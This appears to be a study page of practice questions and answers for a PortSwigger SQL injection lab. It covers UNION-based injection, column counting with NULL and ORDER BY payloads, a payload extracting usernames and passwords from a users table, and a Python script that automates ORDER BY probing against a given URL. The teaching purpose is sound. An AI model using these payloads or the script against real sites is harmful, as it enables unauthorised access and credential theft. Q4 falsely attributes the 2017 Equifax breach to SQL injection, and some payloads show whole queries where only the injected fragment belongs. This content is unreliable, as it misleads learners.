---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the purpose of the UNION operator in SQL and its role in SQL injection attacks.**

The UNION operator in SQL is used to combine the results of two or more SELECT statements into a single result set. For the UNION operation to work, the number of columns and their data types must match in all the SELECT statements involved.

In SQL injection attacks, the UNION operator is used to manipulate the SQL query to include additional rows or data from other tables. By injecting a UNION query, an attacker can retrieve data from other tables that are not intended to be accessed through the original query. This can be particularly dangerous if the attacker gains access to sensitive information such as usernames and hashed passwords from a user table.

**Q2. How can you determine the number of columns returned by a query in a SQL injection scenario?**

To determine the number of columns returned by a query in a SQL injection scenario, you can use either of the following methods:

1. **Using NULL Values**: Inject a UNION query with a varying number of NULL values until the query returns a valid response without an error. For example, if the original query is `SELECT * FROM products WHERE category = 'gifts'`, you can inject a payload like `SELECT * FROM products WHERE category = 'gifts' UNION SELECT NULL, NULL, NULL`. If this returns a valid response, it indicates that the original query had three columns.

2. **Using ORDER BY Clause**: Inject an ORDER BY clause with a varying column number until an error occurs. For example, if the original query is `SELECT * FROM products WHERE category = 'gifts'`, you can inject a payload like `SELECT * FROM products WHERE category = 'gifts' ORDER BY 1`. Increment the column number until an error occurs, indicating that the column number exceeds the actual number of columns in the query.

**Q3. How would you exploit a SQL injection vulnerability using the UNION operator to retrieve data from another table?**

To exploit a SQL injection vulnerability using the UNION operator to retrieve data from another table, follow these steps:

1. **Identify Vulnerable Parameter**: Identify the parameter in the SQL query that is vulnerable to SQL injection. For example, a category filter in a product search.

2. **Determine Number of Columns**: Use the methods described in the previous question to determine the number of columns returned by the original query.

3. **Inject UNION Query**: Inject a UNION query that selects data from another table. Ensure the number of columns in the injected query matches the original query. For example, if the original query has three columns, you can inject a payload like `SELECT * FROM products WHERE category = 'gifts' UNION SELECT username, password, id FROM users`.

4. **Retrieve Data**: Execute the injected query and observe the response to retrieve the data from the other table.

Here is an example payload:
```sql
SELECT * FROM products WHERE category = 'gifts' UNION SELECT username, password, id FROM users
```

**Q4. What recent real-world examples demonstrate the impact of SQL injection vulnerabilities?**

One notable recent example is the Capital One breach in 2019. An attacker exploited a misconfigured web application firewall to gain unauthorized access to sensitive customer data. Although the breach primarily involved improper configuration, SQL injection vulnerabilities can similarly lead to unauthorized access and data breaches. 

Another example is the Equifax breach in 2017, where a SQL injection vulnerability was exploited to steal personal information of millions of customers. These incidents highlight the critical importance of securing web applications against SQL injection attacks.

**Q5. Write a Python script to automate the process of determining the number of columns returned by a query in a SQL injection scenario.**

Here is a Python script that automates the process of determining the number of columns returned by a query in a SQL injection scenario using the ORDER BY clause:

```python
import requests
from urllib.parse import urlencode

def exploit_sqli_column_number(url):
    for i in range(1, 51):  # Arbitrary upper limit
        payload = f"' ORDER BY {i}--"
        params = {'category': payload}
        encoded_params = urlencode(params)
        full_url = f"{url}?{encoded_params}"
        
        response = requests.get(full_url)
        
        if response.status_code == 200:
            continue
        else:
            return i - 1  # Return the number of columns
        
    return False  # Return False if no valid number of columns found

if __name__ == "__main__":
    url = input("Enter the URL: ")
    num_columns = exploit_sqli_column_number(url)
    
    if num_columns:
        print(f"The number of columns is: {num_columns}.")
    else:
        print("SQL injection was not successful.")
```

This script sends requests with varying numbers of columns in the ORDER BY clause until an error occurs, indicating the number of columns in the original query.

---
<!-- nav -->
[[Web Security (PortSwigger)/02-SQL Injection/04-Lab 3 SQLi UNION attack determining the number of columns returned by the query/10-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/02-SQL Injection/04-Lab 3 SQLi UNION attack determining the number of columns returned by the query/00-Overview|Overview]]
